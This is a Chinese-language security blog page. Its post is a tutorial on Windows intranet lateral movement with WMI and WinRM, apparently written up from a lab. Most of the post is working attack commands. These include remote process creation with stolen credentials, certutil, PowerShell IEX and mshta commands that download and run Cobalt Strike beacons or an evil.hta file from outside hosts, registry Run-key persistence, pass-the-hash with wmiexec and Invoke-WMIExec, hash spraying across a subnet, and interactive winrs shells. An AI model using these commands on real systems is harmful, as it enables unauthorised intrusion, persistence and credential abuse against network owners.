<!DOCTYPE html>
<html lang="cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"cangqingzhe.github.io","root":"/","scheme":"Muse","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="知行合一">
<meta property="og:type" content="website">
<meta property="og:title" content="藏青&#39;s BLOG">
<meta property="og:url" content="https://cangqingzhe.github.io/page/3/index.html">
<meta property="og:site_name" content="藏青&#39;s BLOG">
<meta property="og:description" content="知行合一">
<meta property="og:locale" content="cn">
<meta property="article:author" content="藏青">
<meta property="article:tag" content="渗透 内网 代码审计">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://cangqingzhe.github.io/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false
  };
</script>

  <title>藏青's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">藏青's BLOG</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于内网横向移动的学习总结</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-08-21 17:53:05" itemprop="dateCreated datePublished" datetime="2020-08-21T17:53:05+08:00">2020-08-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-09-02 20:04:32" itemprop="dateModified" datetime="2020-09-02T20:04:32+08:00">2020-09-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index">
                    <span itemprop="name">内网渗透</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        当我们进入内网后，并且对当前主机的各种信息已经搜集完毕，接下来就到了最有意思的环节，横向移动。在这个环节，我们可以通过我们的操作获取多台主机的权限，本文将总结内网横向渗透中常用的姿势。</p>
<h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><p><strong>什么是WMI?</strong></p>
<p>​        WMI 的全称是 Windows Management Instrumentation，它出现在所有的 Windows 操作系统中，由一组强大的工具集合组成，用于管理本地或<strong>远程</strong>的 Windows 系统。</p>
<p><strong>为什么要使用WMI？</strong></p>
<p>​        使用WMI进行横向移动，默认不会留下系统日志，并且脚本无需写入磁盘，具有隐蔽性。</p>
<p><strong>如何使用WMI?</strong></p>
<p>​        对于WMI的利用，可以使用windows自带的wmic命令来执行各种操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief 列出进程信息</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823225302723.png" alt="image-20200823225302723"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process call create &quot;calc.exe&quot;  创建进程</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823230056479.png" alt="image-20200823230056479"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount list brief 列出当前账户信息</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823230213681.png" alt="image-20200823230213681"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption 获取启动项中的信息</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823230935974.png" alt="image-20200823230935974"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief 查看启动的服务</span><br><span class="line">wmic service where &quot;name&#x3D;&#39;AppXSvc&#39;&quot; call startservice 启动某个服务</span><br><span class="line">wmic service where &quot;name&#x3D;&#39;AppXSvc&#39;&quot; call stopservice   停止某个服务</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823231132116.png" alt="image-20200823231132116"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823231144901.png" alt="image-20200823231144901"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823231202869.png" alt="image-20200823231202869"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list brief  查看补丁</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823231301814.png" alt="image-20200823231301814"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic ntdomain list brief 获取域控信息</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823231626975.png" alt="image-20200823231626975"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version 获取安装的软件，获取的不一定全</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823231739063.png" alt="image-20200823231739063"></p>
<p><strong>WMI横向渗透条件？</strong></p>
<ul>
<li>开启WMIC默认管理端口135端口</li>
<li>拥有管理员权限</li>
</ul>
<p><strong>WMI横向渗透利用</strong></p>
<p>1、使用WMIC利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.3.144 &#x2F;user:administrator &#x2F;password:Admin12345 PROCESS call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\windows\temp\result.txt&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823234153636.png" alt="image-20200823234153636"></p>
<p>使用WMIC进行横向渗透是无法获取回显的，因此可以通过建立IPC连接，通过IPC读取执行结果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\192.168.3.144\c$\windows\temp\result.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823234529203.png" alt="image-20200823234529203"></p>
<p>使用WMIC执行exe上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.3.144 &#x2F;user:administrator &#x2F;password:&quot;xxx&quot; PROCESS call create &quot;cmd &#x2F;c certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.3.99&#x2F;beacon.exe c:&#x2F;windows&#x2F;temp&#x2F;windwn.exe &amp; c:&#x2F;windows&#x2F;temp&#x2F;windwn.exe &amp; certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.3.99&#x2F;beacon.exe delete&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824095347428.png" alt="image-20200824095347428"></p>
<p>使用WMIC执行powershell上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;NODE:192.168.3.144 &#x2F;user:&quot;administrator&quot; &#x2F;password:&quot;xxx&quot; PROCESS call create &quot;powershell -nop -exec bypass -c \&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.3.99&#x2F;beacon.ps1&#39;);\&quot;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824100644862.png" alt="image-20200824100644862"></p>
<p>使用WMIC修改注册表权限维持</p>
<p>​        首先将我们生成的马放到边界主机上，使用IPC将马移动到目标主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.144\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxx&quot; &amp; xcopy C:\Users\jerry\Desktop\artifact.exe \\192.168.3.144\admin$\temp &amp; net use \\192.168.3.144\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824101718854.png" alt="image-20200824101718854"></p>
<p>​        操作注册表，将文件写入到启动项中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;NODE:&quot;192.168.3.144&quot; &#x2F;USER:&quot;administrator&quot; &#x2F;PASSWORD:&quot;xxx&quot; process call create &quot;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run &#x2F;v \&quot;shell\&quot; &#x2F;t REG_SZ &#x2F;d \&quot;C:\windows\temp\artifact.exe\&quot; &#x2F;f&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824102054065.png" alt="image-20200824102054065"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824102157796.png" alt="image-20200824102157796"></p>
<p>2、使用wmiexec.vbs利用</p>
<p>​        直接使用原生的wmic利用有一个缺陷，就是不能获取返回的内容，使用wmiexe.vbs可以获取到执行的结果，其原理就是先将执行后的结果输出到文件中，再与目标建立IPC连接，查看文件的内容，因此这种利用方式不仅需要目标开启135，也需要开启445,否则无法获取执行后的结果。</p>
<p>​        使用wmiexec.vbs执行命令并获取结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs &#x2F;cmd 192.168.3.144 administrator &quot;xxxx&quot; &quot;query user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824103002551.png" alt="image-20200824103002551"></p>
<p>​        使用wmiexec获取半交互的shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs &#x2F;shell 192.168.3.144 administrator &quot;xxxx&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824103755336.png" alt="image-20200824103755336"></p>
<p>3、使用impacket套件利用</p>
<p>​        在windows下，有已经打包成exe的impacket利用套件，当我们仅仅得到hash而没有得到密码时，可以通过wmiexec.exe来进行横向移动。<strong>hash的值需要区分大小写，否则会执行失败</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -hashes &quot;xxx:xxx&quot; administrator@192.168.3.144 &quot;query user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824111121993.png" alt="image-20200824111121993"></p>
<p>​        也可以使用wmiexec.exe通过密码进行验证来执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe  administrator:xxx@192.168.3.144 &quot;query user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824120039093.png" alt="image-20200824120039093"></p>
<p>​        也可以获取半交互的shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe  administrator:xxx@192.168.3.144</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824120200887.png" alt="image-20200824120200887"></p>
<p>4、使用Invoke-WMIExec利用</p>
<p>​        当只有hash时，也可以通过Invoke-WMIExec来进行横向渗透，不过这种方式无法获取执行后的结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;C:\Users\jerry\Desktop\Invoke-WMIExec.ps1&#39;);Invoke-WMIExec -Target 192.168.3.144  -Username administrator -Hash xxx -Command &quot;whoami&quot; -verbose&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824112842144.png" alt="image-20200824112842144"></p>
<p>​        如果在cs上执行，需要将powershell的双引号转义一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell &quot;&quot;IEX (New-Object Net.WebClient).DownloadString(&#39;C:\Users\jerry\Desktop\Invoke-WMIExec.ps1&#39;);Invoke-WMIExec -Target 192.168.3.144  -Username administrator -Hash xxx -Command &#39;whoami&#39; -verbose&quot;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824113324458.png" alt="image-20200824113324458"></p>
<p>​     在目标可以出外网的情况下，可以使用cs生成一个hta文件，再远程加载hta文件达到上线的目的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell &quot;&quot;IEX (New-Object Net.WebClient).DownloadString(&#39;C:\Users\jerry\Desktop\Invoke-WMIExec.ps1&#39;);Invoke-WMIExec -Target 192.168.3.144  -Username administrator -Hash xxx -Command &#39;mshta http:&#x2F;&#x2F;111.229.70.13:801&#x2F;evil.hta&#39; -verbose&quot;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824114313078.png" alt="image-20200824114313078"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824114350510.png" alt="image-20200824114350510"></p>
<p>​        我们也可以同时导入Invoke-TheHash.ps1和Invoke-WMIExec.ps1来探测同C段中用户hash是否相同</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell &quot;&quot;IEX (New-Object Net.WebClient).DownloadString(&#39;C:\Users\jerry\Desktop\Invoke-WMIExec.ps1&#39;);IEX (New-Object Net.WebClient).DownloadString(&#39;C:\Users\jerry\Desktop\Invoke-TheHash.ps1&#39;);Invoke-TheHash -Type WMIExec -Target 192.168.3.0&#x2F;24 -Username administrator -Hash xxx&quot;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824115328865.png" alt="image-20200824115328865"></p>
<h3 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h3><p><strong>什么是winrm?</strong></p>
<p>​        Web服务管理协议（WS-Management，Web Services-Management）是一种基于SOAP协议的DMTF开放标准，用于对服务器等网络设备以及各种Web应用程序进行管理。而WinRM（<a href="https://docs.microsoft.com/en-us/windows/win32/winrm/portal" target="_blank" rel="noopener">Windows Remote Management</a>）是Windows对WS-Management的实现，WinRM允许远程用户使用工具和脚本对Windows服务器进行管理并获取数据。</p>
<p>​        winrm服务端工作在5985和5986端口上，winrm以SOAP格式来进行数据交换。</p>
<p><strong>有什么利用条件？</strong></p>
<ul>
<li><p>在win2012以上才可以远程主机来管理</p>
</li>
<li><p>防火墙开放对5985和5986端口的连入</p>
<p>可以在powershell下进行测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Test-WsMan 192.168.3.144</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824141035101.png" alt="image-20200824141035101"></p>
</li>
</ul>
<p><strong>winrm横向移动</strong></p>
<p>1、使用winrm直接横向移动</p>
<p>​        使用winrm在本地执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm invoke Create wmicimv2&#x2F;win32_process @&#123;CommandLine&#x3D;&quot;calc.exe&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824141727865.png" alt="image-20200824141727865"></p>
<p>​        使用winrm在远程主机上执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm invoke Create wmicimv2&#x2F;win32_process @&#123;CommandLine&#x3D;&quot;calc.exe&quot;&#125; -r:http:&#x2F;&#x2F;10.0.83.30:5985 -u:administrator -p:123456</span><br></pre></td></tr></table></figure>

<p>​        直接使用会存在一个信任问题</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824142530029.png" alt="image-20200824142530029"></p>
<p>​        可以通过如下命令添加信任</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Item WSMan:\localhost\Client\TrustedHosts -Value &quot;192.168.3.73&quot;</span><br><span class="line">Set-Item WSMan:localhost\client\trustedhosts -value *  信任任意的远程主机</span><br><span class="line">Get-Item WSMan:\localhost\Client\TrustedHosts</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824143736527.png" alt="image-20200824143736527"></p>
<p>​        添加信任后，再使用winrm执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm invoke Create wmicimv2&#x2F;win32_process @&#123;CommandLine&#x3D;&quot;calc.exe&quot;&#125; -r:http:&#x2F;&#x2F;192.168.3.73:5985 -u:administrator -p:xxx</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824144154073.png" alt="image-20200824144154073"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824144213829.png" alt="image-20200824144213829"></p>
<p>2、使用自带的winrs横向渗透</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:192.168.3.73 -u:administrator -p:xxx &quot;query user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824144311792.png" alt="image-20200824144311792"></p>
<p>​        获取交互shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:192.168.3.73 -u:administrator -p:xxx &quot;cmd&quot;</span><br></pre></td></tr></table></figure>

